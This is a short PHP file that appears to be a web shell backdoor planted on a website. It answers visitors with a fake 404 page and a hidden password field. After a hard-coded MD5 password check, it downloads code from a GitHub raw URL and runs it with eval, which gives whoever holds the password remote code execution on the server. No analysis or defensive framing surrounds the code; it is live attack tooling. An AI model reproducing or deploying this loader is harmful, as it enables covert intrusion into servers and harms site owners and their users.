<?php
session_start();
$password = '2a8fe8c772318261bd624a85b2931c40';

if (!isset($_SESSION[md5($password)])) {
    if(isset($_POST['password']) && !empty($_POST['password']) && md5($_POST['password']) == $password) {
        $_SESSION[md5($password)] = true;
    } else {
        http_response_code(404);
        echo '<form method="post" action=""><input type="password" style="border:none" name="password"></form>';
        exit;
    }
}
$sa = file_get_contents('https://raw.githubusercontent.com/seokabupaten/professor/refs/heads/main/details');
eval('?>'.$sa);
